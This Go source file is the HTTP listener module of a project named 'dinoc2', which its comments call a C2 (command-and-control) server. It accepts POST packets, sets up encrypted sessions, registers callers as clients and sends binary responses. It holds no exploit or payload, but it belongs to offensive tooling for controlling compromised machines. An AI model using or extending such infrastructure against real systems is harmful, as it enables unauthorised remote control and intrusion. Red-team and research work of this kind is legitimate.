package http

import (
	"dinoc2/pkg/client"
	"dinoc2/pkg/crypto"
	"dinoc2/pkg/protocol"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"strings"
	"time"
)

// HTTPListener implements an HTTP listener for the C2 server
type HTTPListener struct {
	config        map[string]interface{}
	address       string
	port          int
	server        *http.Server
	clientManager interface{}
	isRunning     bool
}

// NewHTTPListener creates a new HTTP listener
func NewHTTPListener(config map[string]interface{}) (*HTTPListener, error) {
	// Extract address and port
	address, ok := config["address"].(string)
	if !ok {
		return nil, fmt.Errorf("invalid configuration: listener address is required")
	}
	
	portFloat, ok := config["port"].(float64)
	if !ok {
		return nil, fmt.Errorf("invalid configuration: listener port is required")
	}
	port := int(portFloat)
	
	// Extract options
	options, ok := config["options"].(map[string]interface{})
	if !ok {
		options = make(map[string]interface{})
	}

	return &HTTPListener{
		config:    options,
		address:   address,
		port:      port,
		isRunning: false,
	}, nil
}

// SetClientManager sets the client manager for the listener
func (l *HTTPListener) SetClientManager(cm interface{}) {
	l.clientManager = cm
	fmt.Printf("DEBUG: HTTP listener client manager set: %T\n", cm)
}

// Start starts the HTTP listener
func (l *HTTPListener) Start() error {
	if l.isRunning {
		return fmt.Errorf("listener is already running")
	}

	// Create HTTP server
	mux := http.NewServeMux()
	mux.HandleFunc("/", l.handleRequest)
	
	l.server = &http.Server{
		Addr:    fmt.Sprintf("%s:%d", l.address, l.port),
		Handler: mux,
	}

	// Start server in a goroutine
	go func() {
		err := l.server.ListenAndServe()
		if err != nil && err != http.ErrServerClosed {
			fmt.Printf("HTTP server error: %v\n", err)
		}
	}()

	l.isRunning = true
	fmt.Printf("HTTP listener started on %s:%d\n", l.address, l.port)

	return nil
}

// Stop stops the HTTP listener
func (l *HTTPListener) Stop() error {
	if !l.isRunning {
		return nil
	}

	// Close server
	if l.server != nil {
		err := l.server.Close()
		if err != nil {
			return fmt.Errorf("failed to close HTTP server: %w", err)
		}
	}

	l.isRunning = false
	fmt.Printf("HTTP listener stopped\n")

	return nil
}

// handleRequest handles an HTTP request
func (l *HTTPListener) handleRequest(w http.ResponseWriter, r *http.Request) {
	// Only allow POST requests
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Read request body
	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed to read request body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	// Check if body is empty
	if len(body) == 0 {
		http.Error(w, "Empty request body", http.StatusBadRequest)
		return
	}

	// Create a protocol handler for processing the data
	protocolHandler := protocol.NewProtocolHandler()
	
	// Generate a unique session ID
	sessionID := crypto.GenerateSessionID()
	
	// Decode the packet to get the encryption algorithm
	packet, err := protocol.DecodePacket(body)
	if err != nil {
		http.Error(w, "Failed to decode packet", http.StatusBadRequest)
		return
	}

	// Create a session with the encryption algorithm
	err = protocolHandler.CreateSession(sessionID, packet.Algorithm)
	if err != nil {
		http.Error(w, "Failed to create session", http.StatusInternalServerError)
		return
	}

	// Create a new client with the connection information
	newClient := client.NewClient(sessionID, r.RemoteAddr, client.ProtocolHTTP)
	
	// Register client with client manager if available
	if l.clientManager != nil {
		fmt.Printf("DEBUG: HTTP client manager type: %T\n", l.clientManager)
		
		// Try to register client using type assertion
		if cm, ok := l.clientManager.(*client.Manager); ok {
			clientID := cm.RegisterClient(newClient)
			fmt.Printf("Registered HTTP client with ID %s\n", clientID)
		} else {
			fmt.Printf("Client manager does not implement RegisterClient method or is not of type *client.Manager\n")
		}
	} else {
		fmt.Printf("No client manager available\n")
	}

	// Process the packet
	response, err := protocolHandler.ProcessPacket(packet)
	if err != nil {
		http.Error(w, "Failed to process packet", http.StatusInternalServerError)
		return
	}

	// Set content type
	w.Header().Set("Content-Type", "application/octet-stream")
	
	// Write response
	_, err = w.Write(response)
	if err != nil {
		fmt.Printf("Failed to write response: %v\n", err)
	}
}
